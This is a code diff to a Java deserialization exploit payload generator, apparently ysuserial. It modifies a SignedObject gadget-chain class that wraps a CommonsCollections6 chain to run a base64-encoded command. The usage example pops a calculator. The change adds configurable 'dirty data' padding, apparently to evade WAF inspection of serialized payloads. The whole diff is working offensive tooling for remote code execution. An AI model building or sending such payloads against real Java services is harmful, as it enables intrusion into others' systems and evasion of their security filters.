@@ -39,7 +39,7 @@ import static org.su18.ysuserial.payloads.util.Utils.base64Decode;
  * 6. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
  * <p>
  * 利用方式：
- * SignedObject 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000' 20000
+ * -g SignedObject -p 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:1:10000' -dt 1 -dl 20000
  *
  * @author su18
  */
@@ -51,7 +51,7 @@ public class SignedObject implements ObjectPayload<Object> {
 		String[] commands = command.split(":");
 
 		if (commands.length < 3) {
-			throw new IllegalArgumentException("Command format is: <Type>:<Original_Type>:<Command_Base64>:[10000]");
+			throw new IllegalArgumentException("Command format is: <Type>:<Original_Type>:<Command_Base64>:<Dirty_Type>:<Dirty_Length>");
 		}
 
 		String type   = commands[0];
@@ -93,8 +93,9 @@ public class SignedObject implements ObjectPayload<Object> {
 		Object                               object       = payload.getObject(realCmd);
 
 		if (args.length >= 3) {
-			final String length = args[2];
-			object = (new DirtyDataWrapper(object, Integer.parseInt(length))).doWrap();
+			final String type   = args[2];
+			final String length = args[3];
+			object = (new DirtyDataWrapper(object, Integer.parseInt(type), Integer.parseInt(length))).doWrap();
 		}
 
 		return object;
